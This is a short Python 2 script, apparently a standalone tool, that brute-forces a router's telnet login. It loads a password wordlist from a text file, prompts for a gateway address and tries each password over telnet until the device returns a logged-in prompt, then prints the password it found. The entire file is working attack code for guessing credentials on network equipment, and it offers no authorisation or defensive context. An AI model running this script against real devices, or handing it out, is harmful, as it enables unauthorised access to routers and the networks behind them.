import sys
import telnetlib
import time

# Process Start Time
start_time = time.time()

# Open Textfile that Contains Common Passwords
wordlist = open("password.txt", "r")

# User Inputs Gateway
router_addr = raw_input("\nEnter the Gateway Address: ") # Use 'input' for Windows

# Brute Force Function
def telnetAttack(password):
    tn = telnetlib.Telnet(router_addr) # Telnet Connection
    if password:
        try:
            tn.read_until("Password: ") # Reads for the Input Line
        except EOFError:
            print("\nError: Could Not Identify Password Prompt")
        try:
            tn.write(password + "\n") # Tries the Password, \n to denote key stroke 'enter'
        except:
            print("\nError: Could Not Write Password")
        print("Attempting to Login...")
        try:
	    response = tn.read_until("RISP>", timeout = 10) # Checks for Login Status
	    if ">" in response: # If Login Success	    
		i = 1
	    else:
	 	i = 0
        except EOFError:
            print("\nError with Telnet Login\n")
	    quit()
	tn.close() # Close Current Session
        if i == 1: # Success
            return True
	else:
            return False # Failure

# Password File Management
password = wordlist.readlines()
for pw in password:
    try_password = pw.strip() # Seperating the Password List
    print("\nTesting %s" % try_password)
    if(telnetAttack(try_password)): # Uses a Password from List to Try
        print("\nPassword Found!")
        print("%s\n" % try_password)
        wordlist.close()
	code = 1
        break # Ends Process if Password Found
    else:
	code = 0
        print("Incorrect Password!")
        wordlist.close()

# Output
time_taken = time.time() - start_time
print ("Time Taken: %s seconds\n" % time_taken)
if code == 0:
	print("Password Does Not Exists Within the Provided List!\n")
